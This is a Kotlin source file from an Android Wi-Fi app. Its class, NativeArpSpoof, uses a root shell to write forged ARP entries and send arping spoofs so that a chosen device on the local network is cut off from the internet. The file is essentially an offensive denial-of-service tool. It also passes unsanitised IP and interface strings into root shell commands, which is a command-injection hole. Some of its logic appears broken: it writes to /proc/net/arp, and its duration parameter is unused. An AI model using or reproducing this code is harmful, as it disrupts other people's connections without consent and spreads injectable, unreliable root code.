package com.lsd.wififrankenstein.ui.localnetwork

import android.content.Context
import com.lsd.wififrankenstein.util.Log
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.NetworkInterface

class NativeArpSpoof(private val context: Context) {

    private var cachedTargetMac: String? = null
    private var cachedGatewayMac: String? = null

    suspend fun cutInternet(
        targetIp: String,
        gatewayIp: String,
        iface: String = "wlan0",
        durationSeconds: Int = 0
    ): Pair<Boolean, String> = withContext(Dispatchers.IO) {
        try {
            Log.d(
                TAG,
                "Cutting internet for $targetIp via $gatewayIp (iface=$iface, duration=${durationSeconds}s)"
            )

            val ourMac = getLocalMac(iface)
            if (ourMac == null) {
                return@withContext Pair(false, "Cannot determine our MAC address on $iface")
            }


            cachedTargetMac = readArpCache().firstOrNull { it.ip == targetIp }?.mac
            cachedGatewayMac = readArpCache().firstOrNull { it.ip == gatewayIp }?.mac

            val success = sendArpPoison(targetIp, gatewayIp, ourMac, iface)
            if (!success) {
                return@withContext Pair(false, "ARP poison failed (insufficient permissions?)")
            }

            val msg = if (durationSeconds > 0) {
                "Internet cut for $targetIp for ${durationSeconds}s"
            } else {
                "Internet cut for $targetIp until manual restore"
            }
            Log.d(TAG, msg)
            Pair(true, msg)
        } catch (e: Exception) {
            Log.e(TAG, "Cut failed", e)
            Pair(false, "Error: ${e.message}")
        }
    }

    suspend fun restoreInternet(
        targetIp: String,
        gatewayIp: String,
        iface: String = "wlan0"
    ): Pair<Boolean, String> = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Restoring internet for $targetIp")

            val targetMac = cachedTargetMac ?: readArpCache().firstOrNull { it.ip == targetIp }?.mac
            val gatewayMac =
                cachedGatewayMac ?: readArpCache().firstOrNull { it.ip == gatewayIp }?.mac

            if (targetMac != null) {
                writeArpEntry(targetIp, targetMac, iface)
                Log.d(TAG, "Restored target $targetIp → $targetMac")
            } else {
                Log.w(TAG, "Cannot restore target MAC for $targetIp — not in ARP cache")
            }

            if (gatewayMac != null) {
                writeArpEntry(gatewayIp, gatewayMac, iface)
                Log.d(TAG, "Restored gateway $gatewayIp → $gatewayMac")
            } else {
                Log.w(TAG, "Cannot restore gateway MAC for $gatewayIp — not in ARP cache")
            }

            cachedTargetMac = null
            cachedGatewayMac = null

            Pair(true, "Internet restored for $targetIp (entries will fix on next ARP exchange)")
        } catch (e: Exception) {
            Log.e(TAG, "Restore failed", e)
            Pair(false, "Error: ${e.message}")
        }
    }

    private fun sendArpPoison(
        targetIp: String,
        gatewayIp: String,
        ourMac: String,
        iface: String = "wlan0"
    ): Boolean {
        val localWritesOk = writeArpEntry(targetIp, ourMac, iface)
        val localGatewayOk = writeArpEntry(gatewayIp, ourMac, iface)

        if (localWritesOk || localGatewayOk) {
            Log.d(TAG, "ARP entries written via /proc/net/arp")
        }

        val arpingResult = tryArping(targetIp, gatewayIp, iface)

        return (localWritesOk || localGatewayOk || arpingResult)
    }

    private fun writeArpEntry(ip: String, mac: String, iface: String): Boolean {
        return try {
            val line = "$ip 0x1 0x2 $mac * $iface"
            val cmd = "echo '$line' > /proc/net/arp"
            val result = Shell.cmd(cmd).exec()
            if (result.isSuccess) {
                Log.d(TAG, "Wrote ARP entry: $line")
                true
            } else {
                Log.w(TAG, "Failed to write ARP entry (no root?): ${result.err.joinToString("; ")}")
                false
            }
        } catch (e: Exception) {
            Log.w(TAG, "ARP write failed", e)
            false
        }
    }

    private fun tryArping(targetIp: String, gatewayIp: String, iface: String = "wlan0"): Boolean {
        var success = false

        try {
            val cmd1 = "arping -c 2 -I $iface -s $gatewayIp $targetIp 2>/dev/null"
            val r1 = Shell.cmd(cmd1).exec()
            if (r1.isSuccess) {
                Log.d(TAG, "arping (target←gateway) sent")
                success = true
            }
        } catch (_: Exception) {
        }

        try {
            val cmd2 = "arping -c 2 -I $iface -s $targetIp $gatewayIp 2>/dev/null"
            val r2 = Shell.cmd(cmd2).exec()
            if (r2.isSuccess) {
                Log.d(TAG, "arping (gateway←target) sent")
                success = true
            }
        } catch (_: Exception) {
        }

        return success
    }

    private fun getLocalMac(iface: String): String? {
        return try {
            val nif = NetworkInterface.getByName(iface)
            val macBytes = nif?.hardwareAddress ?: return null
            if (macBytes.size != 6) return null
            macBytes.joinToString(":") { String.format("%02X", it) }
        } catch (_: Exception) {
            null
        }
    }

    private fun resolveTargetMac(ip: String): String? {
        return readArpCache().firstOrNull { it.ip == ip }?.mac
    }

    private fun resolveGatewayMac(gatewayIp: String, iface: String): String? {
        return readArpCache().firstOrNull { it.ip == gatewayIp }?.mac
    }

    private fun readArpCache(): List<ArpEntry> {
        val entries = mutableListOf<ArpEntry>()
        try {
            val br = java.io.BufferedReader(java.io.FileReader("/proc/net/arp"))
            br.use { reader ->
                reader.readLine()
                for (line in reader.lines().toArray().filterIsInstance<String>()) {
                    val parts = line.split("\\s+".toRegex())
                    if (parts.size >= 4) {
                        val ip = parts[0]
                        val mac = parts[3]
                        if (ip.isNotEmpty() && mac.isNotEmpty() && mac != "00:00:00:00:00:00") {
                            entries.add(ArpEntry(ip, mac.uppercase()))
                        }
                    }
                }
            }
        } catch (_: Exception) {
        }
        return entries
    }

    private data class ArpEntry(val ip: String, val mac: String)

    companion object {
        private const val TAG = "NativeArpSpoof"
    }
}
